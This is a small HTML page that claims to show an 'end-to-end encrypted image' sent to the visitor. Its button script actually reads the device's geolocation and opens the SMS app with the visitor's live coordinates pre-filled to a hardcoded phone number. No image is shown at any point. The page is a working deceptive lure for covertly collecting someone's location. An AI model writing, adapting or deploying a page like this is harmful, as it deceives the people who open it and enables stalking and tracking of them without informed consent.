<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Share Your Location</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 50px;
    }
    button {
      padding: 15px 25px;
      font-size: 18px;
      color: white;
      background: #007bff;
      border: none;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>

  <h2>End-To-End Encrypted Image</h2>
  <p>Click the button below to see the image that was sent to you.</p>
  <button onclick="sendLocation()">click here!</button>

  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const phoneNumber = "17807821946"; // Chatr phone number
            const message = encodeURIComponent(`My live location:\nLatitude: ${lat}, Longitude: ${lon}`);
            const smsURL = `sms:${phoneNumber}?body=${message}`;
            
            window.location.href = smsURL; // Opens SMS app with pre-filled message
          },
          function(error) {
            alert("Error retrieving location: " + error.message);
          }
        );
      } else {
        alert("Geolocation is not supported on this device.");
      }
    }
  </script>

</body>
</html>
